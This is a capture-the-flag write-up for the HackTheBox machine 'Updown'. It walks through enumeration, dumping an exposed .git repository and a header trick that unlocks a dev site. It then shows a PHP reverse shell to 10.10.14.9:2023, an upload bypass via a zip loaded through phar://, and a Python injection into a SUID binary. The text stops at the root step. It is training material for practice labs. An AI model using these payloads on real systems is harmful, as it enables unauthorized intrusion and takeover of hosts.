# HTB medium machine Updown Writeup
### Enumeration
#### nmap
```
Nmap scan report for siteisup.htb (10.10.11.177)
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e1f98d7c8ba61dbf149669d701702e7 (RSA)
|   256 c21cfe1152e3d7e5f759186b68453f62 (ECDSA)
|_  256 5f6e12670a66e8e2b761bec4143ad38e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.21 seconds
```

#### gobuster
find a directory`dev`, a `.git` file and a vhost`dev.siteosup.htb`.

#### git-dump
```
$ git-dumper http://siteisup.htb/dev/.git ./www
$ ls -al www                                                                                       
total 44                                                                                                                     
drwxr-xr-x 3 lufei lufei 4096 Jan 31 00:35 .                                                                                 
drwxr-xr-x 3 lufei lufei 4096 Jan 31 00:35 ..                                                                                
-rw-r--r-- 1 lufei lufei   59 Jan 27 23:39 admin.php                                                                         
-rw-r--r-- 1 lufei lufei  147 Jan 27 23:39 changelog.txt                                                                     
-rw-r--r-- 1 lufei lufei 3145 Jan 27 23:39 checker.php                                                                       
-rw-r--r-- 1 lufei lufei 1115 Jan 28 07:45 dangerous.php                                                                     
drwxr-xr-x 7 lufei lufei 4096 Jan 27 23:39 .git                                                                              
-rw-r--r-- 1 lufei lufei  117 Jan 27 23:39 .htaccess                                                                         
-rw-r--r-- 1 lufei lufei  273 Jan 27 23:39 index.php                                                                         
-rw-r--r-- 1 lufei lufei 5531 Jan 27 23:39 stylesheet.css
```

### Foothold
#### File Upload
```
$ git log                                                                                      
commit 010dcc30cc1e89344e2bdbd3064f61c772d89a34 (HEAD -> main, origin/main, origin/HEAD)
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 19:38:51 2021 +0200

    Delete index.php

commit 8812785e31c879261050e72e20f298ae8c43b565
Author: Abdou.Y <84577967+ab2pentest@users.noreply.github.com>
Date:   Wed Oct 20 16:38:54 2021 +0200

    New technique in header to protect our dev vhost.

$ git checkout 8812785e31c879261050e72e20f298ae8c43b565
Note: switching to '8812785e31c879261050e72e20f298ae8c43b565'.

You are in 'detached HEAD' state. You can look around, make experimental
changes and commit them, and you can discard any commits you make in this
state without impacting any branches by switching back to a branch.

If you want to create a new branch to retain commits you create, you may
do so (now or later) by using -c with the switch command. Example:

  git switch -c <new-branch-name>

Or undo this operation with:

  git switch -

Turn off this advice by setting config variable advice.detachedHead to false

HEAD is now at 8812785 New technique in header to protect our dev vhost.
$ ls -al
total 40
drwxr-xr-x 3 lufei lufei 4096 Jan 31 00:49 .
drwxr-xr-x 4 lufei lufei 4096 Jan 31 00:49 ..
-rw-r--r-- 1 lufei lufei   98 Jan 31 00:49 changelog.txt
-rw-r--r-- 1 lufei lufei 1115 Jan 31 00:49 dangerous.php
drwxr-xr-x 7 lufei lufei 4096 Jan 31 00:49 .git
-rw-r--r-- 1 lufei lufei  117 Jan 31 00:49 .htaccess
-rw-r--r-- 1 lufei lufei    1 Jan 31 00:49 .htpasswd
-rw-r--r-- 1 lufei lufei  200 Jan 31 00:49 index.php
-rw-r--r-- 1 lufei lufei 5531 Jan 31 00:49 stylesheet.css
$ cat .htpasswd .htaccess 

SetEnvIfNoCase Special-Dev "only4dev" Required-Header
Order Deny,Allow
Deny from All
Allow from env=Required-Header
```
add Special-Dev: only4dev in request header, we now can view dev.siteisup.htb.
After finger out useful function, we upload a dangerous php
```php
<?php
$dangerous_func = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited',
'pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig',
'pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error',
'pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority',
'pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open',
'passthru','link','symlink','syslog','ld','mail','mb_send_mail','imap_open','imap_mail','libvirt_connect','gnupg_init',
'imagick');

// Loop through dangerous_functions and print if it enabled
foreach ($dangerous_func as $function) {
    if (function_exists($function)) {
        echo $function . " is enabled\n";
    }
}

//  php execute code with proc_open
$cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.9/2023 0>&1'";

$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("pipe", "a")
);

$process = proc_open($cmd, $descriptorspec, $pipes);
```
bypass the fillter
```
$ zip shell.jpeg dangerous.php 
  adding: dangerous.php (deflated 54%)
  
# Listening 0n port 2023
$ ncat -lvnp 2023
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::2023
Ncat: Listening on 0.0.0.0:2023
```
after uploaded file shell.jpeg, checkout the directory name in `/uploads`, then onece we vist `http://dev.siteisup.htb/?page=phar://uploads/<directory_name>/shell.jpeg/dangerous`, now we get a revshell.

### Upgrade shell to developer
```
$ find / -perm -4000 2>/dev/null
/home/developer/dev/siteisup
$ ls -al /home/developer/dev/siteisup
drsw-r--r-- 1 developer www-data 16928 Jan 31 00:23 siteisup
$ ./siteisup
Enter url: __import__('os').system('/bin/bash')
$ whoami
developer
```
### Prriv root
```
$ sudo -l

